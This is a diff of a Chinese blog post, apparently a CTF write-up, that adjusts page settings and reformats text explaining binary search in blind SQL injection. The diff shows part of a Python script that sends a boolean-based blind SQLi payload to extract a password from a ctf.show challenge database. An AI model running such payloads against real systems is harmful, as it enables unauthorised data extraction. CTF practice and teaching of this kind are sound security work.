@@ -9,26 +9,12 @@ categories: ['Web安全']
 
 hiddenFromHomePage: false
 hiddenFromSearch: false
-twemoji: false
-lightgallery: true
-ruby: true
-fraction: true
-fontawesome: true
-linkToMarkdown: true
-rssFullText: false
 
 toc:
   enable: true
-  auto: true
-code:
-  copy: true
-  maxShownLines: 50
 math:
   enable: false
-share:
-  enable: true
-comment:
-  enable: true
+lightgallery: false
 ---
 
 
@@ -40,7 +26,9 @@ comment:
 
 <!--more-->
 
-二分法 时间复杂度为 `O(log2n)`, 二分法查找比遍历字典查找效率高得多
+二分法时间复杂度为 `O(log2n)`
+
+二分法查找比遍历字典查找效率高得多
 
 ```python
 import requests
@@ -50,10 +38,9 @@ url = 'http://a2a7e64c-6f02-4059-84fc-3cdda760b232.challenge.ctf.show/api/index.
 flag = ''
 
 while True:
-
     min = 32
     max = 127
-
+    
     while min < max:
         mid = (min + max) // 2
         payload = '\' and if(ascii(substr((select password from ctfshow_user where username=\'flag\'),{},1))>{},1,0) %23'.format(i,mid)
@@ -67,7 +54,7 @@ while True:
 
 ```
 
-这里主要说一下为什么是 `min = mid +1` 和 `max = mid`
+主要说一下为什么是 `min = mid +1` 和 `max = mid`
 
 当判断 mid 大于某个值的结果为 true 时, 这个所求值肯定是比 mid 要大的 (大于), 所以是 `mid + 1`
 
